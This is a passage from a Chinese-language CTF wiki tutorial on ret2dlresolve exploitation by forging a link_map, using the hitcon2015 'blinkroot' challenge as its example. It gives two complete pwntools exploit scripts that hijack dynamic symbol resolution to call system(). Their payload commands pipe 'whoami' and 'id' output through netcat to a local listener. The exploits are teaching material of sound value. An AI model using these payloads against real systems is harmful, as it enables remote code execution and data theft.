context.terminal=["tmux","splitw","-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")

def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: padding for the relocation entry of idx=0
        0x20: padding for the relocation entry of idx=0
        0x28: padding for the relocation entry of idx=0
        0x30: p_r_offset, offset pointer to the resloved addr
        0x38: r_info
        0x40: append    
      resolved addr
        0x48: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50
        0x50: 6, tag of the DT_SYMTAB
        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x50
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    linkmap += p64(0)*3
    # here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x48 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)

    linkmap = linkmap.ljust(0x68, 'A')

    linkmap += p64(fake_linkmap_addr)

    linkmap += p64(fake_linkmap_addr + 0x50)

    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    return linkmap

# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0    
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(data_addr+43)
payload += "whoami | nc 127.0.0.1 8080\x00"

payload +=ret2dlresolve_with_fakelinkmap_x64(elf,data_addr+len(payload), elf.got["__libc_start_main"],libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024,'A')
# gdb.attach(io)
io.send(payload)
io.interactive()
```

需要注意這裏的 `data_addr+43` 爲僞造的 linkmap 的地址。執行效果如下

```
❯ nc -l 127.0.0.1 8080
iromise
```

上面的這種方式爲僞造 link_map 的 l_addr 爲目標函數和已解析函數之間的偏移。

根據之前的介紹，我們還可以僞造 l_addr 爲已解析函數的地址， st_value 爲已解析函數和目標函數之間的偏移。

```
value = l->l_addr + sym->st_value
```

這裏，由於 `.got.plt` 的下方沒多遠就是 bss 段 data 的位置。當我們控制 linkmap 的地址位於 got 表附近時，同時我們還需要利用 link_map 的幾個動態表指針，偏移從 0x68 開始。因此我們需要仔細構造對應的數據。這裏我們選擇僞造 link_map 到 0x600B80。

```
0x600B80-->link_map
0x600BC0-->data    
0x600BC8-->data+8
0x600BD0-->data+16, args of puts
0x600BE8-->data+24
```

因此，我們可以控制的 puts 的參數的長度最大爲 0x18。

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")


def ret2dlresolve_with_fakelinkmap_x64(libc, fake_linkmap_addr, offset_of_two_addr):
    '''
    libc: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap

    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0xc0
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78
        0x78: 17, tag of the JMPREL
        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x88
        0x88: padding for the relocation entry of idx=0
        0x90: padding for the relocation entry of idx=0
        0x98: padding for the relocation entry of idx=0
        0xa0: p_r_offset, offset pointer to the resloved addr
        0xa8: r_info
        0xb0: append
      resolved addr
        0xb8: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0
        0xc0: 6, tag of the DT_SYMTAB
        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0
        0xd0: 0x0000030000000000
        0xd8: offset_of_two_addr
        0xe0: fake st_size
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x78
    '''
    linkmap = p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr+0xc0)

    linkmap += p64(17) + p64(fake_linkmap_addr + 0x88)
    linkmap += p64(0)*3
    # here we set p_r_offset = libc.sym["__free_hook"]-libc.sym["__libc_start_main"]
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = __libc_start_main_addr
    linkmap += p64((libc.sym["__free_hook"]-libc.sym["__libc_start_main"]) & (2**64 - 1)) + p64(0x7) + p64(0)

    linkmap += p64(0)

    linkmap += p64(6) + p64(fake_linkmap_addr + 0xd0)

    linkmap += p64(0x0000030000000000) + \
        p64(offset_of_two_addr & (2**64 - 1))+p64(0)

    linkmap = linkmap.ljust(0xf8-0x68, 'A')
    linkmap += p64(fake_linkmap_addr + 0x78)

    return linkmap


# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(elf.got["__libc_start_main"])
payload += "id|nc 127.0.0.1 8080\x00".ljust(0x18,'a')
payload += ret2dlresolve_with_fakelinkmap_x64(libc, elf.got["__libc_start_main"], libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024, 'A')
# gdb.attach(io)
io.send(payload)
io.interactive()
```

需要注意的是，在僞造 linkmap  的時候，我們是從偏移 0x68 開始構造的，所以在最後對齊的時候設置 `linkmap.ljust(0xf8-0x68, 'A')`。

執行效果

```shell
❯ nc -l 127.0.0.1 8080
uid=1000(iromise) gid=1000(iromise)...
```

## 總結

|              | 修改 dynamic 節的內容 | 修改重定位表項的位置                                         | 僞造 linkmap                                         |
| ------------ | --------------------- | ------------------------------------------------------------ | ---------------------------------------------------- |
| 主要前提要求 | 無                    | 無                                                           | 無信息泄漏時需要 libc                                |
| 適用情況     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |
| 注意點       |                       | 確保版本檢查通過；確保重定位位置可寫；確保重定位表項、符號表、字符串表一一對應 | 確保重定位位置可寫；需要着重僞造重定位表項、符號表； |

總的來說，與 ret2dlresolve 攻擊最爲相關的一些動態節爲

- DT_JMPREL
- DT_SYMTAB
- DT_STRTAB
- DT_VERSYM

## 題目

- pwnable.kr unexploitable
- pwnable.tw unexploitable
- 0CTF 2018 babystack
- 0CTF 2018 blackhole

## 參考

1. http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ ，深入淺出。
2. https://www.math1as.com/index.php/archives/341/
3. https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
4. https://blog.csdn.net/seaaseesa/article/details/104478081
5. https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md
6. https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot